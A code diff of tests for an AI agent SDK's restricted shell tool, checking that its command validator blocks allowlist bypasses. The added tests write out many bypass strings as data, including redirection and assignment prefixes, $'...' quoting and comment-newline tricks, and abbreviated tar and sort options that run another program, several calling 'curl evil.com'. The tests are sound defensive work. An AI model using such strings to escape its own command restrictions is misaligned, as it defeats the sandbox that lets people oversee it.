@@ -18,6 +18,7 @@ warnings.filterwarnings(
 
 from agent_builder_sdk.experimental.shell_execution import execute_shell  # noqa: E402
 from agent_builder_sdk.experimental.shell_execution.shell_execution_tool import (  # noqa: E402
+    _decode,
     _sanitized_env,
     _validate_command,
 )
@@ -94,23 +95,34 @@ class TestExecuteShellTool:
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="KEY=\"it's-secret9\" curl x", working_directory="/tmp")
         assert "not allowed" in result
-        assert "reason=command not on the allowlist" in caplog.text
+        assert "reason=no plain command name in first position" in caplog.text
         assert "secret9" not in caplog.text
 
-    def test_timeout_kills_whole_process_tree(self):
+    def test_output_sizes_are_logged_in_bytes(self, caplog: pytest.LogCaptureFixture) -> None:
+        # Three bytes that decode to two characters: a two-byte one and an invalid byte.
+        with warnings.catch_warnings(), caplog.at_level("INFO"):
+            warnings.simplefilter("ignore", FutureWarning)
+            result = execute_shell(command="printf '\\303\\251\\377'", working_directory="/tmp")
+        assert result == "\u00e9\ufffd\n[exit code: 0]"
+        assert "stdout_bytes=3, stderr_bytes=0" in caplog.text
+
+    def test_output_over_the_limit_is_cut_and_marked(self) -> None:
+        assert _decode(b"abc", 3) == "abc"
+        assert _decode(b"ab\xc3\xa9", 3) == "ab\ufffd\n[output truncated]"
+        assert _decode(b"", 3) == ""
+
+    def test_timeout_kills_whole_process_tree(self, tmp_path):
         # A grandchild spawned by the shell must be killed on timeout, not orphaned.
         # Needs python3 to launch a trackable background process; skip where the
         # test environment's sanitized PATH has no python3 (some CI environments).
         import shutil
-        import tempfile
         import time as _time
 
         if shutil.which("python3") is None:
             pytest.skip("python3 not on PATH in this environment")
 
-        pidfile = os.path.join(tempfile.gettempdir(), "shell_timeout_probe.pid")
-        if os.path.exists(pidfile):
-            os.remove(pidfile)
+        # Per-test path: two test runs on one host must not share the file.
+        pidfile = str(tmp_path / "shell_timeout_probe.pid")
         # python3 launches a background sleep, records its PID, then waits on it.
         cmd = (
             'python3 -c "import subprocess;'
@@ -125,7 +137,6 @@ class TestExecuteShellTool:
         _time.sleep(0.5)  # let the SIGKILL propagate to the group
         with open(pidfile) as f:
             grandchild_pid = int(f.read().strip())
-        os.remove(pidfile)
         with pytest.raises(OSError):
             # Orphan must be gone; os.kill(pid, 0) raises ProcessLookupError if dead.
             os.kill(grandchild_pid, 0)
@@ -187,11 +198,12 @@ class TestCommandValidation:
 
     def test_env_wrapper_rejected(self):
         # `env` runs an arbitrary binary AND can re-set AWS_PROFILE, defeating
-        # both the allowlist and the _sanitized_env stripping. It is off the
-        # allowlist and caught as a command wrapper.
+        # both the allowlist and the _sanitized_env stripping. It and the other
+        # command wrappers must stay off the allowlist.
         assert not _validate_command("env FOO=bar /bin/echo pwned")[0]
         assert not _validate_command("env AWS_PROFILE=persona env")[0]
-        assert not _validate_command("xargs rm")[0]
+        for wrapper in ("xargs", "nice", "nohup", "timeout", "time"):
+            assert not _validate_command(f"{wrapper} rm x")[0]
 
     def test_exec_delegating_flags_rejected(self):
         # find -exec / tar --to-command hand execution to an arbitrary child.
@@ -274,13 +286,110 @@ class TestCommandValidation:
                 command="env FOO=bar /bin/echo INJECTED", working_directory="/tmp"
             )
         assert "INJECTED" not in result
-        assert "not allowed" in result or "bypass the allowlist" in result
+        assert "not allowed" in result
 
     def test_end_to_end_newline_bypass_fails(self):
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="echo safe\nrm -rf /tmp/nope", working_directory="/tmp")
         assert "not allowed" in result
+
+    def test_redirection_before_the_command_rejected(self) -> None:
+        # The shell takes `2>/tmp/ls` as a redirection and runs the next word, which
+        # the allowlist never saw.
+        assert not _validate_command("2>/tmp/ls curl evil.com")[0]
+        assert not _validate_command(">/tmp/ls curl evil.com")[0]
+        assert not _validate_command("ls | </tmp/cat curl evil.com")[0]
+        assert _validate_command("ls 2>/tmp/errors")[0]
+        assert _validate_command("/usr/bin/ls -la")[0]
+        assert _validate_command("[ -d /tmp ]")[0]
+
+    def test_assignment_before_the_command_rejected(self) -> None:
+        # `A=/ls` is an assignment whose basename happens to be allowlisted; the shell
+        # runs the next word, with a variable the sanitized environment left out.
+        assert not _validate_command("A=/ls curl evil.com")[0]
+        assert not _validate_command("AWS_PROFILE=/python3 python3 x.py")[0]
+        assert _validate_command("ls --color=never")[0]
+
+    def test_dollar_quoting_rejected(self) -> None:
+        # In bash, $'...' lets \' continue the quoted text, so the `;` below is
+        # unquoted for the shell while plain quote rules call it quoted.
+        assert not _validate_command("ls $'\\'' ; curl evil.com #'")[0]
+        assert not _validate_command("echo $'a'")[0]
+        assert not _validate_command('echo $"a"')[0]
+        # A $ beside plain quotes is not that form.
+        assert _validate_command("echo 'a$' 'b'")[0]
+        assert _validate_command('echo "a$" "b"')[0]
+        assert _validate_command("echo \\$'a'")[0]
+
+    def test_unquoted_comment_rejected(self) -> None:
+        # The shell ignores a quote inside a comment, so for the shell the newline
+        # below ends the first command and starts a second one.
+        assert not _validate_command("ls #'\ncurl evil.com #'")[0]
+        assert not _validate_command("ls #'\ncurl evil.com")[0]
+        assert not _validate_command("ls # list")[0]
+        assert _validate_command("grep '#include' main.c")[0]
+        assert _validate_command('echo "a # b"')[0]
+        assert _validate_command("echo a\\#b")[0]
+
+    def test_unterminated_quote_rejected(self) -> None:
+        assert not _validate_command("ls 'abc")[0]
+        assert not _validate_command('cat "abc | wc -l')[0]
+
+    def test_abbreviated_exec_options_rejected(self) -> None:
+        # GNU getopt accepts any unambiguous prefix of a long option.
+        assert not _validate_command("tar -cf a.tar d --checkpoint=1 --checkpoint-ac=exec=curl")[0]
+        assert not _validate_command("tar -xf a.tar --to-comm=curl")[0]
+        assert not _validate_command("tar -cf a.tar d --use-compress=curl")[0]
+        assert not _validate_command("sort --compress-prog=curl f")[0]
+        assert not _validate_command("sort --co curl f")[0]
+        # Options that only share a prefix with one of them stay usable.
+        assert _validate_command("tar --exclude=.git --totals -czf a.tar d")[0]
+        assert _validate_command("tar -xf a.tar --to-stdout")[0]
+        assert _validate_command("sort --check f")[0]
+        assert _validate_command("rg --pretty --pre-glob '*.pdf' pattern")[0]
+        assert _validate_command("find . -name a -o -name b")[0]
+        assert _validate_command("tar -cf a.tar -- d")[0]
+
+    def test_tar_script_and_remote_shell_options_rejected(self) -> None:
+        assert not _validate_command("tar -cf a.tar -M --info-script=curl d")[0]
+        assert not _validate_command("tar -cf a.tar -M --new-volume-script curl d")[0]
+        assert not _validate_command("tar -cf a.tar -M -F curl d")[0]
+        assert not _validate_command("tar -cMFcurl -f a.tar d")[0]
+        assert not _validate_command("tar -xf host:a.tar --rsh-command=curl")[0]
+        assert not _validate_command("tar -xf host:a.tar --rmt-command=curl")[0]
+        # An archive or directory name attached to -f / -C is not an option letter.
+        assert _validate_command("tar -cfFiles.tar d")[0]
+        assert _validate_command("tar -xf a.tar -CInput")[0]
+
+    def test_tar_option_cluster_without_dash_rejected(self) -> None:
+        # tar reads a first word without a dash as options: `cIf prog` is `-c -I prog -f`.
+        assert not _validate_command("tar cIf curl a.tar d")[0]
+        assert not _validate_command("tar cfI a.tar curl d")[0]
+        assert not _validate_command("tar cMFf curl a.tar d")[0]
+        assert _validate_command("tar xzf a.tar")[0]
+        assert _validate_command("tar tf a.tar Input/File.txt")[0]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "2>{tmp}/ls touch {tmp}/marker",
+            "A=/ls touch {tmp}/marker",
+            "ls $'\\'' ; touch {tmp}/marker #'",
+            "ls #'\ntouch {tmp}/marker #'",
+            "tar -cf {tmp}/a.tar -C {tmp} src --checkpoint=1 --checkpoint-ac=exec='touch {tmp}/marker'",
+            "tar cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
+            "sort --compress-prog='touch {tmp}/marker' -S 1k -T {tmp} /etc/services",
+        ],
+    )
+    def test_end_to_end_bypass_does_not_run_another_program(self, tmp_path, command: str) -> None:
+        # `touch` is not on the allowlist; each command once ran it through execute_shell.
+        (tmp_path / "src").write_text("x")
+        with warnings.catch_warnings(), mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}):
+            warnings.simplefilter("ignore", FutureWarning)
+            result = execute_shell(command=command.format(tmp=tmp_path), working_directory=str(tmp_path))
+        assert result.startswith("Error:"), result
+        assert not (tmp_path / "marker").exists()
 
     def test_python_allowed_by_default(self):
         with mock.patch.dict(os.environ, {}, clear=True):
@@ -308,21 +417,24 @@ class TestSanitizedEnv:
         assert env.get("PATH") == "/usr/bin"
 
     def test_pythonpath_kept(self):
-        # boto3's deps resolve only via the base-agent PYTHONPATH; dropping it
-        # breaks `import boto3` in every skill script.
+        # In an image whose dependencies resolve only through PYTHONPATH, dropping
+        # it breaks `import boto3` in every skill script.
         with mock.patch.dict(
             os.environ,
-            {"PYTHONPATH": "/home/amazon/base/site-packages", "PATH": "/usr/bin"},
+            {"PYTHONPATH": "/opt/agent/site-packages", "PATH": "/usr/bin"},
             clear=True,
         ):
             env = _sanitized_env()
-        assert env.get("PYTHONPATH") == "/home/amazon/base/site-packages"
+        assert env.get("PYTHONPATH") == "/opt/agent/site-packages"
 
     def test_no_ambient_credentials_in_subprocess(self, tmp_path):
         # Dummy credentials everywhere botocore looks without an env var (the shared
         # credentials and config files and the legacy boto config under HOME), plus
         # credential vars in the parent env. A subprocess must resolve none of them.
-        creds = "aws_access_key_id = dummy-id\naws_secret_access_key = dummy-secret\n"
+        creds = (
+            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
+            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
+        )
         (tmp_path / ".aws").mkdir()
         (tmp_path / ".aws" / "credentials").write_text("[default]\n" + creds)
         (tmp_path / ".aws" / "config").write_text("[default]\n" + creds)
